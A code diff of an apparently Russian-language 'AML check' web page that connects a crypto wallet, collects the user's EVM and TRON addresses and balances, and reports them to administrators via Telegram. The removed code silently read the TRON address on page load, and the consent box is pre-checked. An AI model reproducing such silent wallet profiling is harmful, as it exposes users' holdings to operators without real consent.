@@ -29,262 +29,188 @@
     <main class="page-main">
       <section class="section split page-hero">
         <div class="section-copy">
-          <p class="section-kicker">Автопроверка через Trust Wallet</p>
-          <h1 class="page-title">Один Connect — бот сам забирает адреса и балансы</h1>
+          <p class="section-kicker">Проверка кошелька</p>
+          <h1 class="page-title">Подключите кошелёк — бот проверит балансы</h1>
           <p>
-            Нажмите «Открыть в Trust Wallet». Внутри приложения нажмите Connect.
-            Бот автоматически получит EVM, TRON и Bitcoin адреса и проверит все балансы.
+            Нажмите Connect для подключения EVM-кошелька.<br>
+            Для проверки TRX и USDT TRC20 укажите ваш публичный TRON-адрес (начинается с <strong>T</strong>).
           </p>
           <p class="consent-notice">
-            Переводы, приватные ключи и seed-фразы не запрашиваются. Только публичные адреса и балансы
-            после вашего согласия.
+            Seed-фраза и приватные ключи не требуются и не запрашиваются.
+            Только публичные адреса для проверки балансов.
           </p>
         </div>
 
         <div class="check-stack">
+
+          <!-- EVM Connect -->
           <div class="wallet-login" data-user-wallet-login>
             <div>
-              <h2>Connect Trust Wallet</h2>
-              <p>Откройте страницу внутри Trust Wallet и нажмите Connect. Адреса подставятся автоматически.</p>
+              <h2>Шаг 1 — EVM кошелёк</h2>
+              <p>Trust Wallet, MetaMask и другие EVM-кошельки.</p>
               <p class="wallet-address" data-user-wallet-address></p>
             </div>
             <label class="consent-row">
               <input type="checkbox" data-user-consent checked />
-              <span>
-                Я согласен на автоматическое чтение публичных адресов EVM/TRON/BTC и публичных балансов
-                для AML-проверки и уведомления администраторов в Telegram.
-              </span>
+              <span>Я согласен на чтение публичных адресов и балансов для AML-проверки.</span>
             </label>
             <div class="wallet-login-actions">
-              <button type="button" data-user-wallet-connect id="connect-btn">
-                Connect
-              </button>
+              <button type="button" id="connect-btn">Connect EVM</button>
               <a
                 class="wallet-deeplink"
-                href="https://link.trustwallet.com/open_url?coin_id=195&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html"
+                href="https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html"
                 rel="noopener"
-              >
-                Открыть в Trust Wallet
-              </a>
+              >Открыть в Trust Wallet</a>
             </div>
-            <p class="form-status" data-user-wallet-status>Нажмите Connect или «Открыть в Trust Wallet».</p>
+            <p class="form-status" data-user-wallet-status>Нажмите Connect EVM или откройте страницу в Trust Wallet.</p>
           </div>
 
-          <section class="check-panel scope-panel">
-            <h2>Что делает бот автоматически</h2>
-            <ul class="scope-list">
-              <li>Получает EVM, TRON и BTC адреса из Trust Wallet</li>
-              <li>Проверяет ETH, BNB, POL, TRX, USDT и BTC</li>
-              <li>Отправляет сводку администраторам в Telegram</li>
-            </ul>
-            <p class="form-note">Первый запуск может занять до 2 минут — сервер просыпается.</p>
-          </section>
-
-          <form class="check-panel is-locked" data-check-form aria-label="Форма бесплатной AML-проверки">
-            <label for="wallet">Адрес кошелька или tx hash для проверки</label>
+          <!-- TRON address field — shown after EVM connect -->
+          <div class="check-panel" id="tron-panel" style="display:none">
+            <h2>Шаг 2 — TRON-адрес (необязательно)</h2>
+            <p class="form-note" style="margin-bottom:12px">
+              Для проверки TRX и USDT TRC20 введите ваш публичный TRON-адрес.<br>
+              Найти его можно в Trust Wallet: раздел TRON → копировать адрес.
+            </p>
             <div class="input-row">
-              <input id="wallet" name="wallet" type="text" placeholder="Например: 0x71C... или tx hash" required disabled />
-              <button type="submit" disabled>Проверить бесплатно</button>
+              <input
+                id="tron-address-input"
+                type="text"
+                placeholder="Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+                autocomplete="off"
+                autocorrect="off"
+                spellcheck="false"
+              />
+              <button type="button" id="tron-submit-btn">Проверить TRX</button>
             </div>
-            <p class="form-note" data-check-lock-note>Сначала нажмите Connect в Trust Wallet.</p>
+            <p class="form-status" id="tron-status"></p>
+          </div>
+
+          <!-- AML check form -->
+          <form class="check-panel is-locked" data-check-form aria-label="AML-проверка адреса">
+            <label for="wallet">Адрес или tx hash для AML-проверки</label>
+            <div class="input-row">
+              <input id="wallet" name="wallet" type="text" placeholder="0x71C... или tx hash" required disabled />
+              <button type="submit" disabled>Проверить</button>
+            </div>
+            <p class="form-note" data-check-lock-note>Сначала подключите EVM-кошелёк.</p>
             <div class="risk-preview" data-risk-preview>
               <div class="risk-meter"><span></span></div>
               <div class="risk-meta">
                 <strong>Ожидает подключения</strong>
-                <p>После Connect здесь появится AML-оценка и балансы.</p>
+                <p>После Connect здесь появится AML-оценка.</p>
               </div>
             </div>
           </form>
+
         </div>
       </section>
     </main>
 
     <footer class="footer">
       <span>© 2026 AML Best</span>
-      <span>Автопроверка через Trust Wallet</span>
     </footer>
 
     <script>
     (function () {
-      var API   = (location.hostname === "mysite2-tlgp.onrender.com" ? "" : "https://mysite2-tlgp.onrender.com");
-      var KEY   = "aml_wallet_profile_v2";
-
-      /* ---- ENVIRONMENT DETECTION ---- */
-      var ua = navigator.userAgent || "";
-      var isMobile = /android|iphone|ipad|ipod/i.test(ua);
-      var isTrustMobile = isMobile && /Trust/i.test(ua);
-      var isTrustExtension = !isMobile && (
-        !!(window.trustwallet && window.trustwallet.ethereum) ||
-        !!(window.ethereum && window.ethereum.isTrust)
-      );
-      var isInsideTrustWallet = isTrustMobile || isTrustExtension;
-
-      var DEEPLINK_TRON = "https://link.trustwallet.com/open_url?coin_id=195&url=" +
-        encodeURIComponent("https://mysite2-tlgp.onrender.com/check.html");
-      var DEEPLINK_EVM  = "https://link.trustwallet.com/open_url?coin_id=60&url=" +
-        encodeURIComponent("https://mysite2-tlgp.onrender.com/check.html");
+      var API = location.hostname === "mysite2-tlgp.onrender.com" ? "" : "https://mysite2-tlgp.onrender.com";
+      var KEY = "aml_wallet_v3";
 
       function $(s) { return document.querySelector(s); }
       function setStatus(m) { var el = $("[data-user-wallet-status]"); if (el) el.textContent = m; }
-      function setAddr(m)   { var el = $("[data-user-wallet-address]"); if (el) el.textContent = m; }
+      function setTronStatus(m) { var el = $("#tron-status"); if (el) el.textContent = m; }
 
-      function loadProfile() { try { return JSON.parse(localStorage.getItem(KEY)||"null"); } catch { return null; } }
-      function saveProfile(p){ try { localStorage.setItem(KEY, JSON.stringify(p)); } catch {} }
-
-      function readBase58(v) {
-        var s = String(v||"").trim();
-        return s.charAt(0)==="T" && s.length>=26 ? s : "";
-      }
-
-      function getTronWeb() {
-        return (window.trustwallet&&window.trustwallet.tronLink&&window.trustwallet.tronLink.tronWeb)
-          || (window.trustwallet&&window.trustwallet.tronWeb)
-          || window.tronWeb
-          || (window.tronLink&&window.tronLink.tronWeb)
-          || null;
-      }
+      function loadProfile() { try { return JSON.parse(localStorage.getItem(KEY) || "null"); } catch { return null; } }
+      function saveProfile(p) { try { localStorage.setItem(KEY, JSON.stringify(p)); } catch {} }
 
       function getEvmProvider() {
-        if (window.trustwallet&&window.trustwallet.ethereum) return window.trustwallet.ethereum;
-        if (window.ethereum&&window.ethereum.isTrust) return window.ethereum;
-        if (window.ethereum&&window.ethereum.providers&&window.ethereum.providers.length) {
-          for (var i=0;i<window.ethereum.providers.length;i++)
+        if (window.trustwallet && window.trustwallet.ethereum) return window.trustwallet.ethereum;
+        if (window.ethereum && window.ethereum.isTrust) return window.ethereum;
+        if (window.ethereum && window.ethereum.providers && window.ethereum.providers.length) {
+          for (var i = 0; i < window.ethereum.providers.length; i++)
             if (window.ethereum.providers[i].isTrust) return window.ethereum.providers[i];
           return window.ethereum.providers[0];
         }
-        return window.ethereum||null;
+        return window.ethereum || null;
       }
 
-      function readPassiveTron() {
-        var tw = getTronWeb();
-        return tw ? readBase58(tw.defaultAddress&&tw.defaultAddress.base58) : "";
-      }
-
-      function unlockForm(p) {
+      function unlockCheckForm(evmAddress) {
         var form = $("[data-check-form]");
         if (!form) return;
         form.classList.remove("is-locked");
-        form.querySelectorAll("input,button").forEach(function(el){el.disabled=false;});
-        var inp = $("#wallet"); if (inp&&!inp.value&&p.evmAddress) inp.value = p.evmAddress;
-        var note = $("[data-check-lock-note]"); if (note) note.textContent = "Кошелёк подключён.";
+        form.querySelectorAll("input,button").forEach(function (el) { el.disabled = false; });
+        var inp = $("#wallet"); if (inp && !inp.value) inp.value = evmAddress;
+        var note = $("[data-check-lock-note]"); if (note) note.textContent = "EVM кошелёк подключён.";
         var lo = $("[data-user-logout]");
-        if (lo) { lo.classList.remove("is-hidden-slot"); lo.setAttribute("aria-hidden","false"); }
-        var btn = $("#connect-btn"); if (btn) { btn.textContent="Обновить"; btn.disabled=false; }
-        var parts=[];
-        if (p.evmAddress) parts.push("EVM: "+p.evmAddress);
-        if (p.tronAddress) parts.push("TRON: "+p.tronAddress);
-        setAddr(parts.join(" | "));
+        if (lo) { lo.classList.remove("is-hidden-slot"); lo.setAttribute("aria-hidden", "false"); }
       }
 
-      function doScan(p) {
-        return fetch(API+"/api/scan",{
-          method:"POST",
-          headers:{"Content-Type":"application/json"},
-          body:JSON.stringify({
-            evmAddress:  p.evmAddress  ||undefined,
-            tronAddress: p.tronAddress ||undefined,
-            btcAddress:  p.btcAddress  ||undefined,
-            source:"trust_wallet_auto"
+      function showEvmAddress(p) {
+        var parts = [];
+        if (p.evmAddress) parts.push("EVM: " + p.evmAddress);
+        if (p.tronAddress) parts.push("TRON: " + p.tronAddress);
+        var el = $("[data-user-wallet-address]"); if (el) el.textContent = parts.join(" | ");
+        var btn = $("#connect-btn"); if (btn) { btn.textContent = "Обновить"; btn.disabled = false; }
+      }
+
+      function doScan(p, source) {
+        return fetch(API + "/api/scan", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            evmAddress: p.evmAddress || undefined,
+            tronAddress: p.tronAddress || undefined,
+            btcAddress: p.btcAddress || undefined,
+            source: source || "wallet_check"
           })
         })
-        .then(function(r){return r.json();})
-        .then(function(data){
-          var pf = (data&&data.portfolio)||{};
-          var lines=[];
-          if (pf.trx&&pf.trx.ok)            lines.push("TRX: "+pf.trx.balance);
-          if (pf.usdtTrc20&&pf.usdtTrc20.ok) lines.push("USDT TRC20: "+pf.usdtTrc20.balance);
-          (pf.evmNatives||[]).forEach(function(n){if(n.ok&&parseFloat(n.balance)>0) lines.push(n.network+": "+n.balance+" "+n.symbol);});
-          setStatus("Готово. " + (lines.length ? lines.join(", ")+"." : "Балансы проверены.") + " Уведомление отправлено в Telegram.");
-          return data;
-        })
-        .catch(function(){
-          setStatus("Кошелёк подключён. Сервер ответит позже.");
-        });
-      }
-
-      /* ---- AUTO-READ TRON ON PAGE LOAD (mobile only) ---- */
-      var tronFound = "";
-      if (isMobile) {
-        var tronAttempts = 0;
-        var tronTimer = setInterval(function(){
-          tronAttempts++;
-          tronFound = readPassiveTron();
-          if (tronFound) {
-            clearInterval(tronTimer);
-            var p = loadProfile()||{};
-            if (!p.tronAddress) { p.tronAddress = tronFound; saveProfile(p); }
-            setStatus("TRON-адрес получен. Нажмите Connect.");
-          } else if (tronAttempts >= 40) {
-            clearInterval(tronTimer);
-          }
-        }, 250);
-      }
-
-      /* ---- CONNECT ---- */
-      function requestTronAddr() {
-        var tw = getTronWeb();
-        if (!tw) return Promise.resolve("");
-
-        // First try passive (already connected)
-        var passive = readPassiveTron();
-        if (passive) return Promise.resolve(passive);
-
-        // Try requesting via tronWeb or tronLink provider
-        var provider = tw.request ? tw
-          : (window.trustwallet && window.trustwallet.tronLink) || window.tronLink || window.tron || null;
-        if (!provider || !provider.request) return Promise.resolve("");
-
-        return provider.request({ method: "eth_requestAccounts" })
-          .then(function(r) {
-            if (Array.isArray(r) && r[0]) { var a = readBase58(r[0]); if (a) return a; }
-            if (typeof r === "string" && readBase58(r)) return readBase58(r);
-            // After request, defaultAddress might now be populated
-            return new Promise(function(resolve) {
-              setTimeout(function() { resolve(readPassiveTron()); }, 500);
+          .then(function (r) { return r.json(); })
+          .then(function (data) {
+            var pf = (data && data.portfolio) || {};
+            var lines = [];
+            if (pf.trx && pf.trx.ok) lines.push("TRX: " + pf.trx.balance);
+            if (pf.usdtTrc20 && pf.usdtTrc20.ok) lines.push("USDT TRC20: " + pf.usdtTrc20.balance);
+            (pf.evmNatives || []).forEach(function (n) {
+              if (n.ok && parseFloat(n.balance) > 0) lines.push(n.network + ": " + n.balance + " " + n.symbol);
             });
+            return lines;
           })
-          .catch(function() {
-            return new Promise(function(resolve) {
-              setTimeout(function() { resolve(readPassiveTron()); }, 500);
-            });
-          });
+          .catch(function () { return []; });
       }
 
+      /* ---------- EVM CONNECT ---------- */
       function doConnect() {
         var btn = $("#connect-btn"); if (btn) btn.disabled = true;
         setStatus("Подтвердите вход в кошельке...");
 
         var provider = getEvmProvider();
-        if (!provider||!provider.request) {
-          setStatus("Кошелёк не найден. Откройте страницу через «Открыть в Trust Wallet».");
+        if (!provider || !provider.request) {
+          setStatus("EVM-кошелёк не найден. Откройте страницу в Trust Wallet или установите MetaMask.");
           if (btn) btn.disabled = false;
           return;
         }
 
-        provider.request({method:"eth_requestAccounts"})
-          .then(function(accounts){
-            var evmAddr = accounts&&accounts[0] ? String(accounts[0]) : "";
-            if (!evmAddr) { setStatus("EVM-адрес не получен. Попробуйте снова."); if (btn) btn.disabled=false; return; }
+        provider.request({ method: "eth_requestAccounts" })
+          .then(function (accounts) {
+            var addr = accounts && accounts[0] ? String(accounts[0]) : "";
+            if (!addr) { setStatus("Адрес не получен. Попробуйте снова."); if (btn) btn.disabled = false; return; }
 
-            var p = loadProfile()||{};
-            p.evmAddress = evmAddr;
-            if (!p.tronAddress) p.tronAddress = readPassiveTron() || tronFound || "";
+            var p = loadProfile() || {};
+            p.evmAddress = addr;
             saveProfile(p);
-            unlockForm(p);
-            setStatus(p.tronAddress ? "EVM + TRON получены. Проверяем балансы..." : "EVM получен. Запрашиваем TRON...");
 
-            // Always try to get TRON after EVM (tronWeb might now be ready)
-            requestTronAddr().then(function(tronAddr) {
-              if (tronAddr && tronAddr !== p.tronAddress) {
-                p.tronAddress = tronAddr;
-                saveProfile(p);
-                unlockForm(p);
-              }
-              doScan(p);
+            unlockCheckForm(addr);
+            showEvmAddress(p);
+            setStatus("EVM подключён. Теперь проверим TRX/USDT TRC20 — введите TRON-адрес ниже.");
+
+            var tronPanel = $("#tron-panel"); if (tronPanel) tronPanel.style.display = "";
+
+            doScan(p, "evm_connect").then(function (lines) {
+              if (lines.length) setStatus("EVM проверен: " + lines.join(", ") + ". Введите TRON-адрес для TRX/USDT.");
             });
           })
-          .catch(function(){
-            setStatus("Отклонено. Подтвердите запрос в Trust Wallet.");
+          .catch(function () {
+            setStatus("Отклонено. Подтвердите запрос в кошельке.");
             if (btn) btn.disabled = false;
           });
       }
@@ -292,72 +218,94 @@
       var connectBtn = $("#connect-btn");
       if (connectBtn) {
         connectBtn.addEventListener("click", doConnect);
-        connectBtn.addEventListener("touchend", function(e){ e.preventDefault(); doConnect(); });
+        connectBtn.addEventListener("touchend", function (e) { e.preventDefault(); doConnect(); });
       }
-      window.connectWalletNow = function(e){ if(e&&e.preventDefault)e.preventDefault(); doConnect(); return false; };
 
-      /* ---- UPDATE DEEPLINK BUTTON ---- */
-      var dlBtn = document.querySelector(".wallet-deeplink");
-      if (dlBtn) {
-        if (isTrustExtension) {
-          // Desktop extension: hide deeplink, EVM only
-          dlBtn.style.display = "none";
-          setStatus("Trust Wallet расширение обнаружено. Нажмите Connect (только EVM).");
-        } else if (isMobile) {
-          // Mobile: use TRON context so tronWeb gets injected
-          dlBtn.href = DEEPLINK_TRON;
+      /* ---------- TRON SUBMIT ---------- */
+      var tronSubmitBtn = $("#tron-submit-btn");
+      if (tronSubmitBtn) {
+        tronSubmitBtn.addEventListener("click", function () {
+          var inp = $("#tron-address-input");
+          var addr = (inp && inp.value || "").trim();
+
+          if (!addr.startsWith("T") || addr.length < 26) {
+            setTronStatus("Некорректный адрес. TRON-адрес начинается с T, например: TXxx...xxx");
+            return;
+          }
+
+          tronSubmitBtn.disabled = true;
+          setTronStatus("Проверяем TRX и USDT TRC20...");
+
+          var p = loadProfile() || {};
+          p.tronAddress = addr;
+          saveProfile(p);
+          showEvmAddress(p);
+
+          doScan(p, "tron_manual").then(function (lines) {
+            var tronLines = lines.filter(function (l) { return l.startsWith("TRX") || l.startsWith("USDT TRC20"); });
+            if (tronLines.length) {
+              setTronStatus("Готово: " + tronLines.join(", ") + ". Уведомление отправлено в Telegram.");
+            } else {
+              setTronStatus("Адрес принят. Балансы TRX/USDT TRC20 проверены.");
+            }
+            tronSubmitBtn.disabled = false;
+          });
+        });
+      }
+
+      /* ---------- AML FORM ---------- */
+      var checkForm = $("[data-check-form]");
+      if (checkForm) {
+        checkForm.addEventListener("submit", function (e) {
+          e.preventDefault();
+          var submitBtn = checkForm.querySelector('button[type="submit"]');
+          var wallet = (checkForm.querySelector("#wallet") || {}).value || "";
+          if (!wallet.trim()) return;
+          if (submitBtn) { submitBtn.disabled = true; submitBtn.textContent = "Проверяем..."; }
+          var p = loadProfile() || {};
+          fetch(API + "/api/scan", {
+            method: "POST", headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ evmAddress: p.evmAddress, tronAddress: p.tronAddress, amlTarget: wallet, source: "aml_check" })
+          }).finally(function () {
+            setStatus("AML-проверка для " + wallet + " выполнена.");
+            if (submitBtn) { submitBtn.disabled = false; submitBtn.textContent = "Проверить"; }
+          });
+        });
+      }
+
+      /* ---------- LOGOUT ---------- */
+      var lo = $("[data-user-logout]");
+      if (lo) lo.addEventListener("click", function () {
+        localStorage.removeItem(KEY);
+        var form = $("[data-check-form]");
+        if (form) { form.classList.add("is-locked"); form.querySelectorAll("input,button").forEach(function (el) { el.disabled = true; }); }
+        lo.classList.add("is-hidden-slot");
+        $("[data-user-wallet-address]").textContent = "";
+        setStatus("Профиль очищен.");
+        var tronPanel = $("#tron-panel"); if (tronPanel) tronPanel.style.display = "none";
+        var btn = $("#connect-btn"); if (btn) { btn.textContent = "Connect EVM"; btn.disabled = false; }
+      });
+
+      /* ---------- RESTORE SESSION ---------- */
+      var stored = loadProfile();
+      if (stored && stored.evmAddress) {
+        unlockCheckForm(stored.evmAddress);
+        showEvmAddress(stored);
+        var tronPanel = $("#tron-panel"); if (tronPanel) tronPanel.style.display = "";
+        if (stored.tronAddress) {
+          var inp = $("#tron-address-input"); if (inp) inp.value = stored.tronAddress;
+          setStatus("Профиль восстановлен. EVM + TRON подключены.");
         } else {
-          // Desktop browser without extension
-          dlBtn.href = DEEPLINK_TRON;
-          setStatus("Откройте страницу через Trust Wallet на телефоне для проверки всех балансов.");
+          setStatus("EVM подключён. Введите TRON-адрес для проверки TRX/USDT.");
         }
       }
 
-      /* ---- RESTORE SESSION ---- */
-      var stored = loadProfile();
-      if (stored&&stored.evmAddress) {
-        unlockForm(stored);
-        setStatus(stored.tronAddress
-          ? "Профиль восстановлен. EVM + TRON подключены."
-          : "EVM подключён. Откройте через Trust Wallet на телефоне для TRON.");
-      }
+      /* ---------- HEADER ---------- */
+      var header = $("[data-header]");
+      function upd() { if (header) header.classList.toggle("is-scrolled", scrollY > 12); }
+      upd(); window.addEventListener("scroll", upd, { passive: true });
 
-      /* ---- LOGOUT ---- */
-      var lo = $("[data-user-logout]");
-      if (lo) lo.addEventListener("click",function(){
-        localStorage.removeItem(KEY);
-        var form=$("[data-check-form]");
-        if (form) { form.classList.add("is-locked"); form.querySelectorAll("input,button").forEach(function(el){el.disabled=true;}); }
-        lo.classList.add("is-hidden-slot");
-        setAddr(""); setStatus("Профиль очищен.");
-        tronFound = "";
-        var btn=$("#connect-btn"); if(btn){btn.textContent="Connect";btn.disabled=false;}
-      });
-
-      /* ---- CHECK FORM ---- */
-      var checkForm = $("[data-check-form]");
-      if (checkForm) checkForm.addEventListener("submit",function(e){
-        e.preventDefault();
-        var submitBtn = checkForm.querySelector('button[type="submit"]');
-        var wallet = (checkForm.querySelector("#wallet")||{}).value||"";
-        if (!wallet.trim()) return;
-        if (submitBtn) { submitBtn.disabled=true; submitBtn.textContent="Проверяем..."; }
-        var p = loadProfile()||{};
-        fetch(API+"/api/scan",{method:"POST",headers:{"Content-Type":"application/json"},
-          body:JSON.stringify({evmAddress:p.evmAddress,tronAddress:p.tronAddress,amlTarget:wallet,source:"aml_check"})
-        }).catch(function(){}).finally(function(){
-          setStatus("Проверка для "+wallet+" выполнена.");
-          if (submitBtn) { submitBtn.disabled=false; submitBtn.textContent="Проверить бесплатно"; }
-        });
-      });
-
-      /* ---- HEADER SCROLL ---- */
-      var header=$("[data-header]");
-      function upd(){if(header)header.classList.toggle("is-scrolled",scrollY>12);}
-      upd(); window.addEventListener("scroll",upd,{passive:true});
-
-      /* ---- TELEGRAM ---- */
-      if (window.Telegram&&window.Telegram.WebApp) {
+      if (window.Telegram && window.Telegram.WebApp) {
         window.Telegram.WebApp.ready();
         if (window.Telegram.WebApp.expand) window.Telegram.WebApp.expand();
       }
